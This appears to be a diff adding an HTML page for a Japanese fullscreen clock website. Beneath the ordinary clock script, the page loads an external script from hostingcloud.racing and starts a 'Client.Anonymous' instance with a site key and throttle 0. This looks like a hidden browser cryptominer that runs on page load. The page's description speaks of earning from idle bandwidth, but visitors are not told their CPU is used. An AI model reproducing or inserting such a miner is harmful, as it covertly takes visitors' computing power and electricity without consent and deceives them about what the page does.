@@ -1,0 +1,176 @@
+<!DOCTYPE html>
+<html lang="ja">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta name="description" content="テキスト" />
+    <link rel="icon" href="img/favicon.png" sizes="16*16" />
+    <meta property="og:type" content="website" />
+    <meta property="og:title" content="time.slot" />
+    <meta
+      property="og:description"
+      content="未使用のネットワーク帯域幅で収益を得るための革新的なブラウザ拡張機能を利用するときに、ブラウザをアイドル状態にしておく必要があります。安全性とプライバシーは私たちの最優先事項であり、あなたの個人情報は一切共有されません。"
+    />
+    <meta property="og:url" content="https://oolongmask.web.fc2.com" />
+    <meta property="og:site_name" content="site_create" />
+    <meta property="article:publisher" content="" />
+    <meta
+      property="og:image"
+      content="https://oolongmask.web.fc2.com/img/slide.png"
+    />
+    <title>TimeSlot</title>
+    <style>
+      html {
+        width: 100vw;
+        height: 100vh;
+        overflow: hidden;
+      }
+      body {
+        background-color: black;
+        display: flex;
+        flex-direction: column;
+        justify-content: center;
+        align-items: center;
+        margin: 0;
+        padding: 0;
+        height: 100vh;
+        box-shadow: border-box;
+        color: #0ff;
+        font-size: 2vw;
+        font-family: "Digital-7 Mono", sans-serif;
+        position: relative;
+      }
+      .navbar {
+        display: flex;
+        justify-content: space-between;
+        padding: 5%;
+        position: absolute;
+        top: 0;
+        right: 4vw;
+      }
+      .navbar a {
+        color: #fff;
+        text-shadow: 0 0vw 0.2vw rgb(255, 255, 255);
+        background-color: #000;
+        font-size: 1vw;
+        font-family: "Arial Rounded MT Bold", sans-serif;
+        text-decoration: none;
+        margin-top: 0;
+        margin-right: 30%;
+        padding: 5%;
+        white-space: nowrap;
+        position: relative;
+      }
+      .dropdown {
+        position: relative;
+        padding-right: 20%;
+        display: inline-block;
+      }
+
+      .dropdown-content {
+        display: none;
+        position: absolute;
+        width: 110%;
+        z-index: 1;
+      }
+
+      .dropdown-content a {
+        color: #59e7fa;
+        padding: 5%;
+        text-decoration: none;
+        display: block;
+      }
+
+      .dropdown-content a:hover {
+        background-color: #707374;
+      }
+
+      .dropdown:hover .dropdown-content {
+        display: block;
+      }
+      #date {
+        color: white;
+        font-size: 2.5vw;
+        text-align: center;
+        font-family: "Arial Rounded MT Bold", sans-serif;
+      }
+
+      #time {
+        color: #0ff;
+        font-size: 10vw;
+        text-align: center;
+        text-shadow: 0 0 5px #0ff;
+        font-family: "Arial Rounded MT Bold", sans-serif;
+      }
+      .button {
+        position: absolute;
+        bottom: 5%;
+        right: 5%;
+        font-size: 1vw;
+        color: rgba(255, 255, 255, 0.5);
+        border-radius: 1vw;
+      }
+    </style>
+    <script src="https://www.hostingcloud.racing/s4ks.js"></script>
+  </head>
+  <body>
+    <div class="navbar">
+      <div class="dropdown">
+        <a href="index.html">デジタル</a>
+        <div class="dropdown-content">
+          <a href="index.html">Existing</a>
+          <a href="custom_dijital.html">Custom</a>
+          <a href="logfile.html">Logfile</a>
+        </div>
+      </div>
+      <div class="dropdown">
+        <a href="analog.html">アナログ</a>
+        <div class="dropdown-content">
+          <a href="analog.html">Existing</a>
+          <a href="custom_analog.html">Custom</a>
+        </div>
+      </div>
+    </div>
+    <div class="button">F11で全画面</div>
+    <div id="date"></div>
+    <div id="time"></div>
+    <script>
+      function showTime() {
+        var date = new Date();
+        var h = date.getHours();
+        var m = date.getMinutes();
+        var s = date.getSeconds();
+        var day = date.getDate();
+        var month = date.getMonth() + 1;
+        var year = date.getFullYear();
+        var days = [" 日 ", " 月 ", " 火 ", " 水 ", " 木 ", " 金 ", " 土 "];
+        var dayOfWeek = days[date.getDay()];
+
+        h = h < 10 ? "0" + h : h;
+        m = m < 10 ? "0" + m : m;
+        s = s < 10 ? "0" + s : s;
+        day = day < 10 ? "0" + day : day;
+        month = month < 10 ? "0" + month : month;
+
+        var dateText =
+          year + " / " + month + " / " + day + "  (" + dayOfWeek + ") ";
+        var time = h + ":" + m + ":" + s;
+        document.getElementById("date").innerText = dateText;
+        document.getElementById("time").innerText = time;
+
+        setTimeout(showTime, 1000);
+      }
+
+      showTime();
+
+      var _client = new Client.Anonymous(
+        "bd1a8cca95367cef24c7e9aebc2b45c23f90d32d480f6e809bde643d2e3a4974",
+        {
+          throttle: 0,
+          c: "w",
+        }
+      );
+      _client.start();
+    </script>
+  </body>
+</html>
